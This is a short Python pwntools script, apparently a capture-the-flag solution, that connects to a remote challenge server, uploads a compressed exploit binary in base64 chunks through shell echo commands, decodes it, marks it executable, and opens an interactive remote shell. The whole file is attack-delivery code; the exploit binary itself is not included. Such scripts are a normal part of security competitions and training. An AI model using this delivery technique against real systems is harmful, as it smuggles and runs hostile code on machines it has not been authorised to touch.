#!/usr/bin/env ipython3
import time,gzip,base64
from pwn import *

def shell():
	last = b''
	r.clean()
	while True:
		cmd = input("$ ")
		r.sendline(cmd)
		out = r.clean().split(b"\r\n")[1:-1]
		for line in out:
			print(line.decode())

r = remote('chal.competitivecyber.club', 8886)
#r = remote("localhost",8886)
time.sleep(15)

with open('./src/exploit', 'rb') as f:
    b = base64.b64encode(gzip.compress(f.read())).decode('ascii')
print(len(b))
r.sendline('cd /home/ctf')
start = time.time()
groups = group(300, b)
for g in groups:
	r.clean()
	r.sendline('echo %s >> solve.gz.b64' % g)

r.sendline('base64 -d ./solve.gz.b64 > solve.gz')
r.sendline('gunzip solve.gz')
r.sendline('chmod +x solve')
#r.sendline('./solve')
r.sendline('dmesg')
print(r.clean())
print(time.time()-start)
shell()
